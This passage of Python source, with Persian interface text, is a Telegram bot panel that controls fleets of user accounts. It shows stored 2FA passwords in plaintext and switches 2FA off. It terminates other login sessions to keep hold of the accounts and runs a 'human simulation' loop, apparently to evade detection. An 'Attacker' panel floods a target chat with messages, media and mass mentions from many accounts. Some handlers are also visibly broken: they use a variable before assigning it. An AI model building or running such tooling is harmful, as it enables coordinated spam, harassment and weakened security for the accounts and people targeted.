              f" پاک‌سازی همگانی ریموت {gname} تموم شد!\n━━━━━━━━━━━━━━\n"
              + "\n".join(results),
              buttons=[[Button.inline("🧹 Cleaner", f"og_clean_{gname}".encode()),
                          Button.inline("📋 Menu", f"og_home_{gname}".encode())]])
      asyncio.get_event_loop().create_task(_do_clean_all())


    # ═══════════════════════════════════════════════════════════
    # OWNER GROUP: DISABLE ALL ACCOUNTS  (og_disableall_ prefix)
    # ═══════════════════════════════════════════════════════════
    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_disableall_(.+)")))
    async def og_disableall_cb(event):
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer(" دسترسی ندارید", alert=True)
      online = [s for s in og_sessions(gname) if s in managed]
      if not online:
          return await event.answer(" هیچ اکانت آنلاینی نیست", alert=True)
      await sp_edit(event,
          f" Turn Off All اکانت‌ها — ریموت {gname}\n━━━━━━━━━━━━━━\n"
          f" {len(online)} اکانت آنلاین خاموش می‌شن\n\n"
          f"مطمئنی؟",
          buttons=[
              [Button.inline(f"✅ Yes — Turn Off All ({len(online)})", f"og_disableall_ok_{gname}".encode())],
              [Button.inline("❌ Cancel", f"og_home_{gname}".encode())],
          ])
      await event.answer()

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_disableall_ok_(.+)")))
    async def og_disableall_ok_cb(event):
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer(" دسترسی ندارید", alert=True)
      sessions = og_sessions(gname)
      turned_off = 0
      for sess in sessions:
          manually_disabled.add(sess)  # جلوگیری از روشن شدن خودکار
          meta = managed.pop(sess, None)
          if meta:
              t = meta.get("task")
              if t:
                    t.cancel()
              try:
                    await meta["client"].disconnect()
              except Exception:
                    pass
              turned_off += 1
      save_disabled()
      asyncio.create_task(refresh_protected_clients())
      await sp_edit(event,
          f" {turned_off} اکانت از ریموت {gname} خاموش شدن.\n همه آفلاین.\n تا دستور روشن نشن.",
          buttons=[[Button.inline("📋 Menu", f"og_home_{gname}".encode())]])
      await event.answer(f" {turned_off} اکانت خاموش شد", alert=True)

    # ═══════════════════════════════════════════════════════════
    # OG: PHONE NUMBERS
    # ═══════════════════════════════════════════════════════════
    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_phones_(.+)")))
    async def og_phones_cb(event):
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer(" دسترسی ندارید", alert=True)
      sessions = og_sessions(gname)
      if not sessions:
          return await event.answer(" هیچ اکانتی در این ریموت نیست", alert=True)
      lines = []
      for sess in sessions:
          info = sessions_db.get(sess, {})
          phone = info.get("phone", "?")
          has_2fa = "🔐" if info.get("twofa") else "🔓"
          status = "🟢" if sess in managed else "🔴"
          lines.append(f"{status} {has_2fa} {sess}: {phone}")
      txt = f"📌 شماره‌های اکانت‌ها — {gname}\n━━━━━━━━━━━━━━\n" + "\n".join(lines)
      await sp_edit(event, txt, buttons=[[Button.inline("🔙 Back", f"og_home_{gname}".encode())]])
      await event.answer()

    # ═══════════════════════════════════════════════════════════
    # OG: 2FA KEY LIST
    # ═══════════════════════════════════════════════════════════
    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_2falist_(.+)")))
    async def og_2falist_cb(event):
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer(" دسترسی ندارید", alert=True)
      sessions = og_sessions(gname)
      if not sessions:
          return await event.answer(" هیچ اکانتی در این ریموت نیست", alert=True)
      lines = []
      for sess in sessions:
          info = sessions_db.get(sess, {})
          phone = info.get("phone", "?")
          twofa = info.get("twofa", "")
          status = "🟢" if sess in managed else "🔴"
          if twofa:
              lines.append(f"{status} {sess}\n 📱 {phone}\n ||{twofa}||")
          else:
              lines.append(f"{status} {sess}\n 📱 {phone}\n بدون 2FA")
      txt = f"🔑 کلیدهای 2FA — {gname}\n━━━━━━━━━━━━━━\n\n" + "\n\n".join(lines)
      await sp_edit(event, txt, buttons=[[Button.inline("🔙 Back", f"og_home_{gname}".encode())]])
      await event.answer()

    # ═══════════════════════════════════════════════════════════
    # OG: DISABLE 2FA FOR GROUP SESSIONS
    # ═══════════════════════════════════════════════════════════
    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_dis2fa_(.+)")))
    async def og_dis2fa_cb(event):
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer(" دسترسی ندارید", alert=True)
      targets = [(s, sessions_db[s]) for s in og_sessions(gname)
                   if s in sessions_db and sessions_db[s].get("twofa")]
      if not targets:
          return await event.answer(" هیچ اکانتی 2FA ذخیره‌شده ندارد", alert=True)
      await sp_edit(event,
          f"📌 خاموش کردن 2FA — {gname}\n━━━━━━━━━━━━━━\n"
          f"{len(targets)} اکانت دارای 2FA\n\nمطمئنی؟",
          buttons=[
              [Button.inline(f"✅ بله — خاموش کن ({len(targets)})", f"og_dis2fa_ok_{gname}".encode())],
              [Button.inline("❌ لغو", f"og_home_{gname}".encode())],
          ])
      await event.answer()

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_dis2fa_ok_(.+)")))
    async def og_dis2fa_ok_cb(event):
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer(" دسترسی ندارید", alert=True)
      targets = [(s, sessions_db[s]) for s in og_sessions(gname)
                   if s in sessions_db and sessions_db[s].get("twofa")]
      if not targets:
          return await event.answer(" موردی پیدا نشد", alert=True)
      await event.answer(" در حال اجرا...")
      await sp_edit(event,
          f" خاموش کردن 2FA — {gname}\n{len(targets)} اکانت در صف...",
          buttons=[[Button.inline("🔘 Please Wait...", b"noop")]])

      async def _run():
          ok_list, fail_list = [], []
          for sess, info in targets:
              twofa = info.get("twofa", "")
              phone = info.get("phone", "")
              try:
                    cl = managed.get(sess, {}).get("client")
                    own = False
                    if not cl:
                        cl = _make_client(sess_path(sess), session_name=sess)
                        await cl.connect()
                        own = True
                    try:
                        await cl.edit_2fa(current_password=twofa, new_password='')
                        sessions_db[sess].pop("twofa", None)
                        save_db()
                        ok_list.append(f"✅ {sess} ({phone})")
                    finally:
                        if own:
                            try: await cl.disconnect()
                            except Exception: pass
              except Exception as e:
                    fail_list.append(f"❌ {sess} ({phone}): {str(e)[:60]}")
          lines = [f"🔑 نتیجه خاموش کردن 2FA — {gname}\n━━━━━━━━━━━━━━"]
          lines += ok_list if ok_list else ["— موردی موفق نشد"]
          if fail_list:
              lines.append("\nخطاها:")
              lines += fail_list
          await sp(event.chat_id, "\n".join(lines),
                     buttons=[[Button.inline("🔙 Back", f"og_home_{gname}".encode())]])

      asyncio.create_task(_run())

    # ═══════════════════════════════════════════════════════════
    # OG: KILL SESSIONS (terminate other logins)
    # ═══════════════════════════════════════════════════════════
    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_killsess_(.+)")))
    async def og_killsess_cb(event):
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer(" دسترسی ندارید", alert=True)
      online = [s for s in og_sessions(gname) if s in managed]
      if not online:
          return await event.answer(" هیچ اکانت آنلاینی نیست", alert=True)
      await sp_edit(event,
          f"🗑 پاک‌سازی نشست‌ها — {gname}\n━━━━━━━━━━━━━━\n"
          f"{len(online)} اکانت آنلاین\n\n"
          f"تمام نشست‌های غیرمجاز روی همه اکانت‌های این ریموت terminate می‌شن.\n"
          f"نشست ربات (hash=0) دست نمی‌خوره.\n\nمطمئنی؟",
          buttons=[
              [Button.inline(f"✅ بله — پاک‌سازی ({len(online)})", f"og_killsess_ok_{gname}".encode())],
              [Button.inline("❌ لغو", f"og_home_{gname}".encode())],
          ])
      await event.answer()

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_killsess_ok_(.+)")))
    async def og_killsess_ok_cb(event):
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer(" دسترسی ندارید", alert=True)
      online = [s for s in og_sessions(gname) if s in managed]
      if not online:
          return await event.answer(" هیچ اکانت آنلاینی نیست", alert=True)
      await event.answer(" در حال پاک‌سازی...")
      await sp_edit(event,
          f"🗑 در حال پاک‌سازی {len(online)} اکانت...",
          buttons=[[Button.inline("🔘 Please Wait...", b"noop")]])

      async def _run():
          from telethon.tl.functions.account import GetAuthorizationsRequest, ResetAuthorizationRequest
          total_killed = total_failed = total_none = 0
          report_lines = []

          # trusted devices این ریموت — هر سشنی که device_model+platform مطابقت داشت نگه می‌داریم
          _td_list = groups_db.get(gname, {}).get("trusted_devices", [])

          def _is_trusted(auth) -> bool:
              dm = (getattr(auth, "device_model", "") or "").strip()
              dp = (getattr(auth, "platform",     "") or "").strip()
              return any(
                  t.get("device_model", "").strip() == dm and
                  t.get("platform",     "").strip() == dp
                  for t in _td_list
              )

          async def _clear_one(sess):
              nonlocal total_killed, total_failed, total_none
              # سشن‌های سیستمی هرگز نباید از طریق og_killsess پاک بشن
              if sess in (MAIN_SESSION, "bot_session"):
                    return
              meta = managed.get(sess)
              if not meta:
                    return
              try:
                    result = await meta["client"](GetAuthorizationsRequest())
                    killed = failed = skipped = 0
                    for a in result.authorizations:
                        if a.hash == 0:          # سشن جاری اکانت (خود ربات)
                            continue
                        if _is_trusted(a):       # trusted device — دست نمی‌زنیم
                            skipped += 1
                            continue
                        try:
                            await meta["client"](ResetAuthorizationRequest(hash=a.hash))
                            killed += 1; total_killed += 1
                        except Exception:
                            failed += 1; total_failed += 1
                    if killed == 0 and failed == 0:
                        total_none += 1
                    else:
                        sk_txt = f" (🔒{skipped} trusted)" if skipped else ""
                        report_lines.append(f"✅ {sess}: {killed}✓ {failed}✗{sk_txt}")
              except Exception as e:
                    report_lines.append(f"❌ {sess}: {str(e)[:40]}")

          await asyncio.gather(*[_clear_one(s) for s in online])
          summary = (
              f"🗑 پاک‌سازی نشست‌ها — {gname}\n━━━━━━━━━━━━━━\n"
              f"✅ terminate شد: {total_killed}\n"
              f"❌ ناموفق: {total_failed}\n"
              f"— بدون نشست اضافه: {total_none}\n━━━━━━━━━━━━━━\n"
          )
          detail = "\n".join(report_lines)
          full = (summary + detail)[:4000]
          await sp(event.chat_id, full,
                     buttons=[[Button.inline("🔙 Back", f"og_home_{gname}".encode())]])

      asyncio.create_task(_run())

    # ═══════════════════════════════════════════════════════════
    # OG: CHECK SPAM STATUS
    # ═══════════════════════════════════════════════════════════
    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_checkstatus_(.+)")))
    async def og_checkstatus_cb(event):
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer(" دسترسی ندارید", alert=True)
      sessions = og_sessions(gname)
      if not sessions:
          return await event.answer(" هیچ اکانتی در این ریموت نیست", alert=True)
      await sp_edit(event,
          f"📊 در حال بررسی اکانت‌های ریموت {gname}...\nممکنه چند ثانیه طول بکشه.",
          buttons=[[Button.inline("🔘 Please Wait...", b"noop")]])
      await event.answer()
      results = []
      ok_count = warn_count = ban_count = offline_count = 0
      for sess_name in sessions:
          info = sessions_db.get(sess_name, {})
          phone = info.get("phone", "?")
          meta = managed.get(sess_name)
          dn = (meta["state"].get("display_name") or sess_name) if meta else sess_name
          if not meta:
              results.append(f"🔴 {dn} ({phone})\n   └ آفلاین")
              offline_count += 1
              continue
          status = await _check_report_status(meta["client"])
          if "✅" in status:
              icon = "✅"; ok_count += 1
          elif "ریپورت دائمی" in status or "بن" in status.lower() or "🚫" in status:
              icon = "🚫"; ban_count += 1
          elif "ریپورت موقت" in status or "⏳" in status or "⚠️" in status:
              icon = "⚠️"; warn_count += 1
          else:
              icon = "❓"
          results.append(f"{icon} {dn} ({phone})\n   └ {status}")
      summary = (
          f"📊 نتیجه بررسی — {gname}\n━━━━━━━━━━━━━━\n"
          f"کل: {len(sessions)}   سالم: {ok_count}   ریپورت موقت: {warn_count}\n"
          f"بن/دائمی: {ban_count}   آفلاین: {offline_count}\n━━━━━━━━━━━━━━\n"
      )
      chunk_size = 15
      chunks = [results[i:i+chunk_size] for i in range(0, len(results), chunk_size)] or [[]]
      await sp(event.chat_id, summary + "\n".join(chunks[0]),
                 buttons=[[Button.inline("🔙 Back", f"og_home_{gname}".encode())]])
      for chunk in chunks[1:]:
          await bot.send_message(event.chat_id, "\n".join(chunk))

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_enableall_(.+)")))
    async def og_enableall_cb(event):
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer(" دسترسی ندارید", alert=True)
      sessions = og_sessions(gname)
      offline = [s for s in sessions if s not in managed]
      if not offline:
          return await event.answer(" همه اکانت‌ها قبلاً روشنن", alert=True)
      await event.answer(" در حال روشن کردن...")
      await sp_edit(event,
          f" در حال روشن کردن {len(offline)} اکانت ریموت {gname}...",
          buttons=[[Button.inline("📋 Menu", f"og_home_{gname}".encode())]])

      async def _do_og_enable():
          turned_on = failed = 0
          for sess in offline:
              manually_disabled.discard(sess)  # از لیست دستی‌خاموش در بیار
              save_disabled()
              # protected client رو قبل از start_worker قطع کن
              await stop_protected_client(sess)
              await start_worker(sess)
              if sess in managed:
                    turned_on += 1
              else:
                    failed += 1
              await asyncio.sleep(1)
          await bot.send_message(event.chat_id,
              f" روشن کردن ریموت {gname} تموم شد!\n روشن شد: {turned_on}\n ناموفق: {failed}",
              buttons=[[Button.inline("📋 Menu", f"og_home_{gname}".encode())]])
      asyncio.get_event_loop().create_task(_do_og_enable())

    # ═══════════════════════════════════════════════════════════
    # OWNER GROUP: SETTINGS PANEL  (og_settings_ prefix)
    # ═══════════════════════════════════════════════════════════
    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_settings_(.+)")))
    async def og_settings_cb(event):
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer(" دسترسی ندارید", alert=True)
      rows = [[Button.inline(f"🗂 {'🟢' if s in managed else '🔴'} {s}", f"og_set1_{gname}|{s}".encode())]
              for s in og_sessions(gname)]
      rows.append([Button.inline("🔙 Back", f"og_home_{gname}".encode())])
      await sp_edit(event, f" Settings — ریموت {gname}:\nاکانت رو انتخاب کن:", buttons=rows)
      await event.answer()

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_set1_([^|]+)\|(.+)")))
    async def og_set1_cb(event):
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer(" دسترسی ندارید", alert=True)
      sess = event.pattern_match.group(2).decode()
      meta = managed.get(sess)
      at = meta["state"].get("autotyping", False) if meta else False
      ar2 = meta["state"].get("autorecord", False) if meta else False
      ba = meta["state"].get("bot_active", True) if meta else False
      hs = meta["state"].get("human_sim", False) if meta else False
      txt = (
          f" Settings — {sess}\n━━━━━━━━━━━━━━\n"
          f"اتو تایپینگ: {'✅' if at else '❌'}\n"
          f"اتو رکورد: {'✅' if ar2 else '❌'}\n"
          f"ربات فعال: {'✅' if ba else '❌'}\n"
          f"شبیه‌ساز انسانی: {'✅' if hs else '❌'}"
      )
      await sp_edit(event, txt, buttons=[
          [Button.inline(f"🔴 {'⏹ Typing Off' if at else ' Typing On'}", f"og_tgl_typing_{gname}|{sess}".encode()),
             Button.inline(f"🔴 {'⏹ Record Off' if ar2 else ' Record On'}", f"og_tgl_record_{gname}|{sess}".encode())],
          [Button.inline(f"🔴 {'⏹ Bot Off' if ba else ' Bot Active'}", f"og_tgl_bot_{gname}|{sess}".encode())],
          [Button.inline(f"🤖 {'⏹ Human Sim Off' if hs else '▶️ Human Sim On'}", f"og_tgl_humansim_{gname}|{sess}".encode())],
          [Button.inline("🔙 Back", f"og_settings_{gname}".encode())],
      ])
      await event.answer()

    for _tgl_key in ["typing", "record", "bot"]:
      @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_tgl_" + _tgl_key.encode() + rb"_([^|]+)\|(.+)")))
      async def og_tgl_cb(event, __key=_tgl_key):
          if not og_guard(event, gname):
              return await event.answer()
          gname = event.pattern_match.group(1).decode()
          sess = event.pattern_match.group(2).decode()
          meta = managed.get(sess)
          if not meta:
              return await event.answer(" آفلاین")
          field_map = {"typing": "autotyping", "record": "autorecord", "bot": "bot_active"}
          field = field_map[__key]
          meta["state"][field] = not meta["state"].get(field, False)
          save_session_state(sess, meta["state"])
          st = "✅" if meta["state"][field] else "❌"
          await event.answer(f"{__key} → {st}")
          await sp_edit(event, f" {sess} — {__key}: {st}",
                         buttons=[[Button.inline("🔙 Back", f"og_set1_{gname}|{sess}".encode())]])

    # ── Human Sim toggle ──────────────────────────────────────
    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_tgl_humansim_([^|]+)\|(.+)")))
    async def og_tgl_humansim_cb(event):
      if not og_guard(event, gname):
          return await event.answer()
      gname = event.pattern_match.group(1).decode()
      sess  = event.pattern_match.group(2).decode()
      meta  = managed.get(sess)
      if not meta:
          return await event.answer("آفلاین", alert=True)
      cur = meta["state"].get("human_sim", False)
      meta["state"]["human_sim"] = not cur
      save_session_state(sess, meta["state"])
      if meta["state"]["human_sim"]:
          # شروع task
          old = _human_sim_tasks.pop(sess, None)
          if old and not old.done():
              old.cancel()
          _human_sim_tasks[sess] = asyncio.create_task(
              _human_sim_loop(meta["client"], sess, meta["state"])
          )
          await event.answer("🤖 Human Sim روشن شد", alert=False)
      else:
          # توقف task
          t = _human_sim_tasks.pop(sess, None)
          if t and not t.done():
              t.cancel()
          await event.answer("⏹ Human Sim خاموش شد", alert=False)
      st = "✅" if meta["state"]["human_sim"] else "❌"
      await sp_edit(event, f"🤖 {sess} — Human Sim: {st}",
                     buttons=[[Button.inline("🔙 Back", f"og_set1_{gname}|{sess}".encode())]])

    # ═══════════════════════════════════════════════════════════
    # OG ADMIN MANAGEMENT PANEL
    # ═══════════════════════════════════════════════════════════
    def _og_admins_text(gname):
      info  = groups_db.get(gname, {})
      owner = info.get("owner", "—")
      admins = info.get("og_admins", [])
      lines  = "\n".join(f"• {a}" for a in admins) if admins else "— هیچ ادمینی نیست —"
      return (
          f" مدیریت ادمین‌ها — ریموت {gname}\n━━━━━━━━━━━━━━\n"
          f" مالک: {owner}\n\n"
          f"ادمین‌ها ({len(admins)} نفر):\n{lines}\n"
          f"━━━━━━━━━━━━━━\n"
          f"ادمین‌ها به همه قابلیت‌های این ریموت دسترسی دارند."
      )

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_admins_(.+)")))
    async def og_admins_cb(event):
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer(" فقط مالک اصلی می‌تونه ادمین مدیریت کنه", alert=True)
      admins = groups_db.get(gname, {}).get("og_admins", [])
      rows = [
          [Button.inline("➕ Add Admin", f"og_admadd_{gname}".encode()),
             Button.inline("🗑 Remove Admin", f"og_admdel_{gname}".encode())],
          [Button.inline("📌 Clear All Admins", f"og_admclr_{gname}".encode())],
          [Button.inline("👥 کنترل ریموت", f"og_home_{gname}".encode())],
      ]
      await sp_edit(event, _og_admins_text(gname), buttons=rows)
      await event.answer()

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_admadd_(.+)")))
    async def og_admadd_cb(event):
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer(" فقط مالک اصلی", alert=True)
      pending_group_selection[event.sender_id] = {"og_step": "ogadmadd", "og_gname": gname}
      await sp_edit(event,
          f" آیدی عددی تلگرام ادمین جدید رو بنویس:\n(/done برای پایان)",
          buttons=[[Button.inline("❌ Cancel", f"og_admins_{gname}".encode())]])
      await event.answer()

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_admdel_(.+)")))
    async def og_admdel_cb(event):
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer(" فقط مالک اصلی", alert=True)
      admins = groups_db.get(gname, {}).get("og_admins", [])
      if not admins:
          return await event.answer("هیچ ادمینی نیست", alert=True)
      rows = []
      for uid in admins:
          rows.append([Button.inline(f"🔘 {uid}", f"og_admrmv_{gname}|{uid}".encode())])
      rows.append([Button.inline("🔙 Back", f"og_admins_{gname}".encode())])
      await sp_edit(event, " کدوم ادمین حذف شه؟", buttons=rows)
      await event.answer()

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_admrmv_([^|]+)\|(.+)")))
    async def og_admrmv_cb(event):
      gname = event.pattern_match.group(1).decode()
      uid_s = event.pattern_match.group(2).decode()
      if not og_guard(event, gname):
          return await event.answer(" فقط مالک اصلی", alert=True)
      try:
          uid = int(uid_s)
      except ValueError:
          return await event.answer(" خطا")
      admins = groups_db.setdefault(gname, {}).setdefault("og_admins", [])
      if uid in admins:
          admins.remove(uid)
      save_groups()
      await event.answer(f" {uid} حذف شد")
      await sp_edit(event, _og_admins_text(gname), buttons=[
          [Button.inline("➕ Add Admin", f"og_admadd_{gname}".encode()),
             Button.inline("🗑 Remove Admin", f"og_admdel_{gname}".encode())],
          [Button.inline("📌 Clear All Admins", f"og_admclr_{gname}".encode())],
          [Button.inline("👥 کنترل ریموت", f"og_home_{gname}".encode())],
      ])

    @bot.on(events.CallbackQuery(pattern=re.compile(rb"og_admclr_(.+)")))
    async def og_admclr_cb(event):
      gname = event.pattern_match.group(1).decode()
      if not og_guard(event, gname):
          return await event.answer(" فقط مالک اصلی", alert=True)
      groups_db.setdefault(gname, {})["og_admins"] = []
      save_groups()
      await event.answer(" همه ادمین‌ها پاک شدن")
      await sp_edit(event, _og_admins_text(gname), buttons=[
          [Button.inline("➕ Add Admin", f"og_admadd_{gname}".encode()),
             Button.inline("🗑 Remove Admin", f"og_admdel_{gname}".encode())],
          [Button.inline("👥 کنترل ریموت", f"og_home_{gname}".encode())],
      ])

    # ═══════════════════════════════════════════════════════════
    # OG ATTACKER PANEL (ogatk_ prefix — runs on main management bot)
    # ═══════════════════════════════════════════════════════════
    def _og_atk_state(gname):
      atk = groups_db.setdefault(gname, {}).setdefault("attacker", {
          "active": False, "target": "", "items": [], "delay": 2, "mention_ids": []
      })
      atk.setdefault("mention_ids", [])
      atk.setdefault("seq_mode", False)
      atk.setdefault("seq_interval", 1)
      atk.setdefault("auto_stop_hours", 0)
      return atk

    def _og_atk_text(gname):
      atk = _og_atk_state(gname)
      active = atk.get("active", False)
      target = atk.get("target", "—")
      items  = atk.get("items", [])
      delay  = atk.get("delay", 2)
      txts   = sum(1 for i in items if i["type"] == "text")
      medias = len(items) - txts
      tags   = len(atk.get("mention_ids", []))
      combo  = atk.get("combo_mode", False)
      seq    = atk.get("seq_mode", False)
      seq_iv = atk.get("seq_interval", 1)
      ash    = atk.get("auto_stop_hours", 0)
      ash_txt = f"{ash} ساعت" if ash else "غیرفعال"
      return (
          f"{pe('⚔️')} Attacker — ریموت {gname}\n━━━━━━━━━━━━━━\n"
          f"وضعیت: {pe('🟢') + ' فعال' if active else pe('🔴') + ' متوقف'}\n"
          f"مقصد: {target}\n"
          f"تاخیر: {delay} ثانیه\n"
          f"{pe('📝')} متن: {txts}  |  {pe('🖼')} مدیا: {medias}\n"
          f"{pe('👥')} منشن‌ها: {tags} نفر\n"
          f"{pe('🔀')} حالت ترکیبی: {pe('✅') + ' فعال' if combo else pe('❌') + ' غیرفعال'}\n"
          f"{pe('🔁')} Sequential: {pe('✅') + f' فعال (هر {seq_iv} ثانیه یه اکانت)' if seq else pe('❌') + ' غیرفعال'}\n"
          f"{pe('⏰')} خاموش خودکار: {ash_txt}\n"
          f"━━━━━━━━━━━━━━\n"
          f"{pe('⚠️') + ' در حال ارسال...' if active else 'آماده'}"
      )

    def _og_atk_buttons(gname):
      atk = _og_atk_state(gname)
      active = atk.get("active", False)
      tag_cnt = len(atk.get("mention_ids", []))
      all_sessions = groups_db.get(gname, {}).get("sessions", [])
      sel_sessions = atk.get("sel_sessions", None)
      sel_count = len(sel_sessions) if sel_sessions is not None else len(all_sessions)
      total_count = len(all_sessions)
      ash = atk.get("auto_stop_hours", 0)
      ash_lbl = f"{ash}h" if ash else "خاموش"
      toggle = [Button.inline("⏹ Stop", f"ogatk_stop_{gname}".encode())] if active else \
                 [Button.inline("🟢 Start Attack", f"ogatk_start_{gname}".encode())]
      return [
          toggle,
          [Button.inline(f"👤 اکانت‌های اتکر: {sel_count}/{total_count}", f"ogatk_selsess_{gname}".encode())],
          [Button.inline("👥 From Joined Groups", f"ogatk_selgrp_{gname}".encode())],
          [Button.inline("🎯 Manual Target", f"ogatk_settgt_{gname}".encode()),
             Button.inline(f"⚔️ Delay ({atk.get('delay',2)}s)", f"ogatk_delay_{gname}".encode())],
          [Button.inline("➕ Add Text", f"ogatk_addtext_{gname}".encode()),
             Button.inline("🖼 Photo", f"ogatk_addphoto_{gname}".encode())],
          [Button.inline("🖼 GIF", f"ogatk_addgif_{gname}".encode()),
             Button.inline("🖼 Video", f"ogatk_addvideo_{gname}".encode())],
          [Button.inline("🖼 Sticker", f"ogatk_addsticker_{gname}".encode())],
          [Button.inline(f"🔀 Combo: {'✅' if atk.get('combo_mode') else '❌'}", f"ogatk_combo_{gname}".encode())],
          [Button.inline(f"🔁 Sequential: {'✅' if atk.get('seq_mode') else '❌'}", f"ogatk_seqmode_{gname}".encode()),
           Button.inline(f"⏱ Seq Interval ({atk.get('seq_interval', 1)}s)", f"ogatk_seqinterval_{gname}".encode())],
          [Button.inline(f"⏰ خاموش خودکار: {ash_lbl}", f"ogatk_autostop_{gname}".encode())],
          [Button.inline(f"🔘 Mentions ({tag_cnt})", f"ogatk_tags_{gname}".encode())],
          [Button.inline(f"𒀽 Symbol: {groups_db.get(gname,{}).get('atk_char','𒀽')}", f"ogatk_setsym_{gname}".encode())],
          [Button.inline("📌 Clear All Content", f"ogatk_clr_{gname}".encode())],
          [Button.inline("🔙 Back", f"og_home_{gname}".encode())],
      ]

    def _parse_target(raw):
      raw = str(raw).strip()
      for prefix in ("https://t.me/", "http://t.me/", "t.me/"):
          if raw.startswith(prefix):
              raw = raw[len(prefix):]
              break
      raw = raw.lstrip("@")
      try:
          return int(raw)
      except ValueError:
          return raw if raw else None

    async def _resolve_uid_mention(client, mid_s: str, target):
      """
      Resolve a user ID/username to an InputUser with a valid access_hash.
      Returns InputUser if resolved, None otherwise.
      Strategy 1: get_entity (cache hit — fastest)
      Strategy 2: GetParticipantRequest from target group/channel
      Strategy 3: GetFullChat for basic groups
      Strategy 4: InputUser(access_hash=0) fallback
      """
      from telethon.tl.types import InputPeerUser, Channel, Chat as _TLGrpChat, InputUser as _IU
      is_username = mid_s.startswith("@")
      uid_int: Optional[int] = None
      if not is_username:
          try:
              uid_int = int(mid_s)
          except Exception:
              return None

      # Strategy 1: direct entity lookup (uses Telethon's local cache)
      try:
          ent = await client.get_entity(mid_s if is_username else uid_int)
          return _IU(user_id=ent.id, access_hash=ent.access_hash)
      except Exception:
          pass

      if is_username:
          return None

      # Strategy 2: GetParticipantRequest (supergroup / channel)
      if target is not None:
          try:
              from telethon.tl.functions.channels import GetParticipantRequest as _GPR
              target_ent = await client.get_entity(target)
              if isinstance(target_ent, Channel):
                    result = await client(_GPR(
                        channel=target_ent,
                        participant=InputPeerUser(user_id=uid_int, access_hash=0)
                    ))
                    for u in getattr(result, 'users', []):
                        if getattr(u, 'id', None) == uid_int:
                            return _IU(user_id=u.id, access_hash=u.access_hash)
                    try:
                        ent = await client.get_entity(uid_int)
                        return _IU(user_id=ent.id, access_hash=ent.access_hash)
                    except Exception:
                        pass
          except Exception:
              pass

          # Strategy 3: GetFullChat for basic groups
          try:
              from telethon.tl.functions.messages import GetFullChatRequest as _GFCR
              target_ent2 = await client.get_entity(target)
              if isinstance(target_ent2, _TLGrpChat):
                    full = await client(_GFCR(chat_id=target_ent2.id))
                    for u in getattr(full, 'users', []):
                        if getattr(u, 'id', None) == uid_int:
                            return _IU(user_id=u.id, access_hash=u.access_hash)
          except Exception:
              pass

      # Strategy 4: fallback with access_hash=0
      if uid_int is not None:
          return _IU(user_id=uid_int, access_hash=0)
      return None

    async def _og_atk_loop(gname):
      _key = f"og_{gname}"
      if _key not in atk_stats:
          atk_stats[_key] = {"sent": 0, "errors": 0, "started_at": datetime.utcnow(), "target": ""}
      _og_flood_cd: Dict[str, float] = {}   # sess -> epoch when cooldown expires (flood/conn)
      _og_conn_cd:  Dict[str, float] = {}   # sess -> epoch for connection-error cooldown
      _og_mention_cache: list = []           # cached resolved mention lines
      _og_mention_cache_ids: list = []       # what we cached (to detect changes)
      _og_cached_mention_target = None       # target used when building mention cache
      _og_cached_target_raw: str = ""        # last raw target string
      _og_cached_target = None               # parsed result (invalidated when raw changes)
      _og_rr_idx: int = 0                    # round-robin index for sequential mode
      _og_loop_start = time.time()           # for auto-stop timer

      while True:
          try:
              atk = groups_db.get(gname, {}).get("attacker", {})
              if not atk.get("active"):
                    break
              # ── auto-stop after N hours ──────────────────────────────
              _as_hours = float(atk.get("auto_stop_hours", 0))
              if _as_hours > 0 and (time.time() - _og_loop_start) >= _as_hours * 3600:
                    atk["active"] = False
                    save_groups()
                    log.info(f"[ogatk:{gname}] auto-stop after {_as_hours}h")
                    break
              target_raw = atk.get("target", "")
              atk_stats[_key]["target"] = target_raw
              items  = atk.get("items", [])
              delay  = max(0.3, float(atk.get("delay", 2)))
              if not target_raw or not items:
                    await asyncio.sleep(1)
                    continue
              # Cache parsed target — re-parse only when raw string changes
              if target_raw != _og_cached_target_raw:
                    _og_cached_target_raw = target_raw
                    _og_cached_target = _parse_target(target_raw)
              target = _og_cached_target
              if not target:
                    await asyncio.sleep(2)
                    continue
              sessions = groups_db.get(gname, {}).get("sessions", [])
              sel_sess = atk.get("sel_sessions", None)
              if sel_sess is not None:
                    sessions = [s for s in sessions if s in sel_sess]
              online   = [s for s in sessions if s in managed]
              if not online:
                    await asyncio.sleep(2)
                    continue

              # rebuild mention cache — stores (sym, InputUser) tuples for real MentionName entities
